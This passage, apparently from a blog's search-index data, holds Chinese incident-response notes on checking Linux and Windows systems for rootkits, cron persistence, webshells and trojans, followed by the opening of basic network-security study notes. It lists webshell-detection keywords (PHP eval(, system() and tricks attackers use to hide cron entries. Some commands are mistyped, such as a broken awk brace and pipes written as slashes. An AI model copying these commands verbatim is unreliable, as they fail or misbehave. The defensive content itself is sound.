在系统中;窃取  账号、密码等重要凭证\n排查要点: 使用包管理自带的  包校验功能  验证文件完整性; 分析恶意文件行为，确定影响面\n操作要点: 使用  静态链接的 busybox; 重新安装被替换的包  命令:rpm - Va                        —- 用于 RPM 软件包管理系统的dpkg –verify                 —- 用于 Debian 软件包管理系统的\nld.so. preload 动态链接库劫持  相关表现: 无明显表现\n相关危害: 将  后门、木马持久化  在系统中; 窃取账号、密码等重要凭证\n排查要点: 检查 **&#x2F;etc&#x2F;ld. so. preload，ld.so**(如 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so)\n操作要点: 使用静态链接的 busybox; 重启  被注入恶意模块的进程，必要时直接重启系统\n内核态 rootkit相关表现: 无明显表现\n相关危害: 将  后门、木马持久化  在系统中; 隐藏文件、进程等信息\n排查要点: 确定是否存在  无法使用常规命令查看的文件、进程;\n操作要点: 使用 tyton 内核态 rootkit 检测工具 检测; 检查 **&#x2F;etc&#x2F;modules是否有  未知的内核模块 **\n计划任务  相关表现:特定时间间隔触发  木马、后门、网络链接、DNS 请求、篡改页面等行为\n相关危害: 将  后门、木马持久化  在系统中; 周期性篡改页面、拉取数据等\n排查要点: 判断是否存在  周期性出现的异常  现象，检查 **&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;，&#x2F;etc&#x2F;cron.*** 等常用计划任务配置文件\n操作要点:停止  计划任务服务  后再操作 ; 注意 辨别利用 \\r 回车符的障眼法  小技巧\n远控木马  相关表现: 有  持续或间断性的对外网络链接  或 DNS 请求等通信行为\n相关危害:窃取  系统资料、作为  跳板  进一步攻击内网其他机器\n排查要点: 关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的 持久化点\n操作要点: 检查网络连接，以及 IDS 设备 上的异常远控告警\nATT&amp;CK 矩阵 Linux 应急响应 关键目录&#x2F;etc&#x2F;passwd                      用户信息文件&#x2F;etc&#x2F;crontab                      定时任务文件&#x2F;etc&#x2F;anacrontab               异步定时任务文件&#x2F;etc&#x2F;rc.d&#x2F;rc.local               开机启动项&#x2F;var&#x2F;log&#x2F;btmp                   登录失败日志，使用 last 命令查看&#x2F;var&#x2F;log&#x2F;cron                     定时任务执行日志&#x2F;var&#x2F;log&#x2F;lastlog                 所有用户最近登录信息，使用 lastlog 查看&#x2F;var&#x2F;log&#x2F;secure                 验证、授权等日志&#x2F;var&#x2F;log&#x2F;wtmp                  包含用户登录日志，使用 last 命令查看&#x2F;var&#x2F;log&#x2F;utmp                   当前登录系统的用户信息，使用 last 命令查看\n常用命令  查看进程资源占用:top\n查看进程:ps -aux\n查看网络连接:netstat -antpl          然后根据 pid，利用 ls -alh &#x2F;proc&#x2F;pid 命令查看其对应的可执行程序\n开放端口的进程: lsof\n显示错误的尝试登录信息: lastb\n显示系统用户最近的登录信息:last\n现实所有的用户最近的登录信息: lastlog\n查找符合条件的字符串:grep\n查看定时任务:crontab -l 、 cat &#x2F;etc&#x2F;crontab\n查看历史命令: history、cat ~&#x2F;.bash_history\n查看当前目录下所有文件并排序:ls -alt\n校验 RPM 软件包: rpm -Va、dpkg -verifyS: 表示对应文件的大小（Size）不一致;M: 表示对于文件的 mode 不一致;5: 表示对应文件的 MD5 不一致;D: 表示文件的 major 和 minor 号不一致;L: 表示文件的符号连接内容不一致;U: 表示文件的 owner 不一致;G: 表示文件的 group 不一致;T: 表示文件的修改时间不一致;\n查看文件（文件夹）详细信息:stat\n查找当前目录下，指定天数内修改的指定类型（or 名称）文件: find .&#x2F; -mtime 0 - name *.jsp\n查找当前目录下，指定天数内新增的指定类型（or 名称）文件: find .&#x2F; -ctime 0 - name *.jsp\n登录成功的 IPgrep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘ {print $11}’| sort | uniq -c | sort -nr | more定位有爆破行为的 IPgrep “Failed password”&#x2F;var&#x2F;log&#x2F;secure|awk ‘ {print $11}’&#x2F; sort &#x2F; uniq -c | sort -nr |more查看隐藏进程ps -ef | awk ‘{print}’l sort -n | uniq &gt;1\nls &#x2F;proc | sort -n | uniq &gt;2diff 1 2\n应急工具busybox\nchkrootkit\nRkhunter\n河马 webshellweb 日志分析\nNCSA 扩展日志格式  目前常见的 WEB 日志格式主要由两类，一类是 Apache 的 NCSA 日志格式，另一类是 IIS 的 W3C 日志格式, 这里主要介绍的是 NCSA 扩展日志格式（ECLF）。\n\n\n\n如何分析 web 日志  先搜索如 SQL 注入之类的攻击关键字?先找出有恶意行为的用户?\n常规黑客攻击思路\nweb 应急思路\n文件内容中的恶意函数PHP:eval(、 system(、 assert(JSP: getRunTime(、FileOutputStream(ASP:eval(、 execute(、ExecuteGlobal （\n查看每个 IP 地址访问次数:cat access.log |awk ‘ (print $1}’|sort|uniq -c访问 URL 排序:cat access.log |awk ‘ {print $11}’|sort|uniq -c|sort -rn |head访问指定资源日志:cat access.log |awk ‘ {print $7}’|grep &#x2F;%25Domain |sort|uniq -c|sort -rn|more\nsqlmap 攻击行为  案例\n\n\nWindows 应急 windows 应急响应基础 常用命令\n\n\n命令\n说明\n\n\n\nTaskmgr\n任务管理器\n\n\nregedit\n注册表\n\n\nMsconfig\n系统配置(包含启动项)\n\n\neventvwr.msc\n事件查看器\n\n\ncompmgmt.msc\n计算机管理(本地用户和组)\n\n\ngpedit.msc\n本地组策略\n\n\ntaskschd.msc\n计划任务\n\n\nlusrmgr. msc\n本地用户和组\n\n\n获取本机用户列表:net user\n本机管理员:net localgroup administrators\n查看当前会话: net session\n查看当前运行的服务:net start\n远程连接:net use\n查看当前用户下的共享目录:net share\n最近打开的文件:%UserProfile%\\Recent 、%APPDATA%\\Microsoft\\Windows\\Recen\n查找文件中的字符串:findstr &#x2F;m &#x2F;i &#x2F;s “hello”*.txt\n查看网络连接: netstat - ano\n操作系统的详细配置信息: systeminfo\n获取系统进程信息:Wmic process\n根据应用程序查找 PID: wmic process where name&#x3D;”cmd.exe” get processid, executablepath, name\n根据 PID 查找应用程序: wmic process where processid&#x3D;”4296” get executablepath, name\n获取系统进程信息:tasklist对于要查询特定 dll 的调用情况，可以使用命令 tasklist &#x2F;m dll 名称\n计算样本 MD5:certutil -hashfile % 样本 exe% MD5\n敏感目录%WINDIR%%WINDIR%\\system32%TEMP%%LOCALAPPDATA%%APPDATA%\n应急工具\nPCHunter 是一款强大的内核级监控软件，软件可以查看内核文件、驱动模块、隐藏进程、注册表, 内核，网络等等信息，和 PCHunter 功能相似的还有火绒剑，PowerTool 等。\nAutoruns 登录时的加载程序、驱动程序加载、服务启动、任务计划等 Windows 中各种方面的启动项\nProcess monitor 主要是监控进程的行为应用程序运行时使用此软件来监控程序的各种操作。此软件主要监控程序的五种行为: 文件系统，注册表，进程，网络，分析。由于此款软件监控的是系统中所有的进程的行为，数据量往往很大，不利于我们分析数据，所以需要对其设置过滤选项，通过 Filter-&gt;Filter 选项可以看到右侧的窗口，在此窗口中增加过滤项。\nTCPView 可以直接查看系统上与所有进程 UDP 和 TCP 端点的详细信息，\nMicrosoft Network Monitor 一款统计准确、占用资源小的网络流量监控软件\n\n\n\nDumpIt   Windows 一款绿色免安装的内存镜像取证工具，利用它可以将系统完整内存镜像下来, 替代工具:FTK Imager   winPMem\nVolatilityVolatility 开源内存取证框架\nweb 日志分析 Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。Windows 主要有以下三类日志记录系统事件: 系统日志、安全日志、应用程序日志 打开方式:1、开始 -&gt; 运行 -&gt;eventvwr2、开始 -&gt; 管理工具 -&gt; 事件查看 -&gt; 安全\n系统日志  系统日志主要是记录了系统组件产生的事件。系统日志主要记录的信息包括驱动程序产生的信息、系统组件产生的信息和应用程序崩溃的信息以及一些数据丢失情况的信息  默认位置:%SystemRoot%System32WinevtLogsSystem. evtx系统启动   ID 12事件日志服务已启动  ID 6005事件日志服务已停止   ID 6006系统关闭   ID 13\n安全日志  主要记录了与系统安全相关的一些事件。这种日志类型主要是记录了用户登入登出的事件、系统资源的使用情况事件以及系统策略的更改事件，如果要查看安全日志信息，则操作员必须具有系统管理员的权限。默认位置:%SystemRoot%System32WinevtLogsSecurity.evtx\n1102  清理审计日志4624  账号成功登录4625  账号登录失败4768  Kerberos 身份验证（TGT 请求)4769  Kerberos 服务票证请求4776  NTLM 身份验证4672  授予特殊权限4720  创建用户4726  删除用户4728  将成员添加到启用安全的全局组中4729  将成员从安全的全局组中移除4732  将成员添加到启用安全的本地组中4733  将成员从启用安全的本地组中移除4756  将成员添加到启用安全的通用组中4757  将成员从启用安全的通用组中移除4719  系统审计策略修改\n\n\n应用程序日志  指的在上的应用程序产生的日志。一般指的的是微软开发的应用程序，第三发开发的基于系统的应用程序如果使用日志记录的函数，则这个应用程序将可以通过事件查看器查看其日志信息。默认位置:%SystemRoot%System32WinevtLogsApplication.evtx\n防御  做一切的前置条件就是阻断病毒横向传播，不阻断传播，反复感染，一切都是徒劳!(方法见防御措施 1234)\n1. 已攻陷主机排查与查杀处置:1)通过天眼或天擎扫描排查已攻陷范围 2) 对于已攻陷主机通过天擎或专杀工具进行查杀。2. 潜在威胁范围确定与应急处置;1)防止扩散或被 C2 的处置措施，在网络出口封堵相关风险域名和 C2 域名和 IP。3．其他防御措施:1)对于重点服务器和主机，做好网络安全域划分并及时打 MS17-010 漏洞补丁，防止利用此漏洞的横向攻击。\n2)开启 Windows 防火墙，尽量关闭 3389、445、139、135 等不用的高危端口.3)每台服务器设置唯一口令 (切记不能多台服务器密码相同)，且复杂度要求采用大小写字母、数字、特殊符号混合的组合结构, 口令位数足够长(15 位、两种组合以上）。4) 如有 SQL SERVER 服务，更改 MSSQL 帐号密码，且复杂度要求采用大小写字母、数字、特殊符号混合的组合结构，口令位数足够长(15 位、两种组合以上)。5）部署全流量监测设备（天眼），及时发现恶意网络流量，进一步追踪溯源。\n","categories":["应急响应基础知识"],"tags":["应急响应"]},{"title":"网络安全","url":"/2022/09/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/","content":"第一章  概述 1.1  信息和信息安全 网络环境下的信息系统由主机、链路和转发结点组成\n信息  信息是对客观世界中各种事物的运动状态和变化的反映，是客观事物之间相互联系和相互作用的表征，表现的是客观事物运动状态和变化的本质内容。\n数据  数据是记录信息的形式，是一种编码。\n信号  信号是数据的电气或电磁表现，是一种能量\n信息安全定义  安全是指不受威胁，没有危险，危害和损失。信息安全是指信息系统中的信息不会因为偶然的或者恶意的原因而遭受破坏、更改和泄露，信息系统能够持续、不间断地提供服务。\n信息安全发展过程 1. 物体承载信息阶段2. 有线通信和无线通信阶段3. 计算机存储信息阶段4. 网络阶段5. 网络空间阶段 信息安全目标 1. 可用性 信息被授权实体访问并按需使用的特性\n2. 保密性  放置信息泄露给非授权个人或实体，只为授权用户使用的特性\n3. 完整性  信息未经授权不能改变的特性\n4. 不可抵赖性  信息交互过程中，所有参与者不能否认曾经完成的操作或承诺的特性。体现在两方面：1）参与者开始参与信息交互时，必须对其真实性进行鉴别。2）信息交互过程中必须能够保留下使其无法否认曾经完成的操作或许下的承诺的证据\n5. 可控制性  对信息传播过程及内容具有控制能力的特性。\n1.2 网络安全  网络安全是指网络环境下的信息系统中分布在主机、链路和转发结点中的信息不受威胁，没有危险、危害和损失。信息系统能够持续正常提供服务。\n网络安全就是网络环境下的信息安全\n引发网络安全问题的原因  主要原因有两个，一是网络和网络中信息资源的重要性，二是网络技术和管理存在的缺陷\n1. 网络和网络中信息资源的重要性 2. 技术与管理缺陷1）通信协议固有缺陷（安全技术）2）硬件、系统软件和应用软件固有缺陷（周边技术）3）不当使用和管理不善（法律法规）1.2.2 网络安全内涵 网络安全内涵包括与保障网络环境下信息可用性，保密性，完整性，不可抵赖性和可控制性的相关理论，协议，技术，管理，标准，法律法规等\n基础理论  各种密钥生成算法，加解密算法和报文摘要算法等，以及这些算法引出的鉴别机制和数字签名方法\n安全协议  为保证信息安全传输而制定的协议，其基础是加解密算法和报文摘要算法，鉴别机制和数字签名等\n网络安全技术  主机安全技术  安全标准  由权威机构颁布的，用于对信息系统、安全产品和网络服务的安全状态和安全功能进行统一的规范性文件\n1）安全标准的作用  一是统一信息系统的安全状态和安全功能，方便信息系统用户与安全产品厂家之间、信息系统用户与安全功能集成商之间的交流。\n二是统一安全产品的安全等级和安全功能。准确描述安全产品的安全等级和功能，方便用户就按需选购安全产品\n三是统一网络服务的安全功能和安全等级，方便用户选择合适的网络服务\n2）计算机存储信息阶段的安全标准  信息系统安全发展过程经理了 5 个阶段，分别是物体承载信息阶段，有线通信和无线通信，计算机存储信息系统，网络阶段和网络空间阶段。\n计算机存储信息阶段的信息安全取决于计算机系统的安全。\n可信计算机系统评估准则（Trusted Computer System Evaluation Criteria, TCSEC）\n3）网路阶段的安全标准  网络由链路，通信结点和主机组成\n通用准则（Information Technology Security Common Criteria, CC）包括简介和一般模型，安全功能要求以及安全保证要求三个部分。在安全保证提出 7 个评估级别，EAL\n4）网络空间阶段 1.3 安全模型 含义：安全模型以建模的方式给出解决安全问题的方法和过程，\n作用：\nP2DR 安全模型组成：\n","categories":["网安"],"tags":["网安"]}]